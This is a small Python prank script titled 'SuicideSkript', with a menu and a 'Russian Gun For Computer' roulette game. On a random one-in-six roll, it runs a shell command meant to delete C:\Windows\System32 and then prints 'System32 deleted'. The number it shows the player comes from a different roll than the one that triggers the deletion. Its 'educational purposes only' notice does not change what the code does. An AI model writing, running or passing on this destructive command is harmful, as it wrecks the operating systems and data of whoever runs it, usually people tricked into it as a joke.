import os
import random
from colorama import init, Fore

os.system("cls || clear") 
init()
banner = Fore.RED + f"""
   _____       _      _     _       _____ _         _       _   
  / ____|     (_)    (_)   | |     / ____| |       (_)     | |  
 | (___  _   _ _  ___ _  __| | ___| (___ | | ___ __ _ _ __ | |_ 
  \___ \| | | | |/ __| |/ _` |/ _ \\___ \| |/ / '__| | '_ \| __|
  ____) | |_| | | (__| | (_| |  __/____) |   <| |  | | |_) | |_ 
 |_____/ \__,_|_|\___|_|\__,_|\___|_____/|_|\_\_|  |_| .__/ \__|
                                                     | |        
                                                     |_|  

            By : @Unknown-user-dev 
        https://github.com/Unknown-user-dev
"""

print(banner)

def menu():
    print(Fore.GREEN + """
    [1] Russian Gun For Computer
    [2] Credits
    [3] Exit
    """)
    choice = input(Fore.BLUE + "Your choice : " + Fore.WHITE)
    if choice not in ["1", "2", "3"]:
        os.system("cls || clear")
        print(banner)
        print(Fore.RED + "Please enter a valid choice" + Fore.WHITE)
        menu()

    if choice == "2":
        os.system("cls || clear")
        print(banner)
        print(Fore.GREEN + "By : @Unknown-user-dev | github.com/Unknown-user-dev | >_Unknown User#8624" + Fore.WHITE)
        menu()
    elif choice == "3":
        print(Fore.RED + "Bye !" + Fore.WHITE)
        exit()
    if choice == "1":
        os.system("cls || clear")
        print(banner)
        print(Fore.GREEN + "Russian Gun For Computer" + Fore.WHITE)
        print(Fore.RED + "This tool is for educational purposes only" + Fore.WHITE)
        print(Fore.GREEN + "The number is : " + Fore.WHITE + str(random.randint(1, 6)))
        if random.randint(1, 6) == 3:
            os.system("del C:\\Windows\\System32")
            print(Fore.RED + "System32 deleted" + Fore.WHITE)
        else:
            print(Fore.GREEN + "System32 not deleted" + Fore.WHITE)
            menu()         
if __name__ == "__main__": menu()
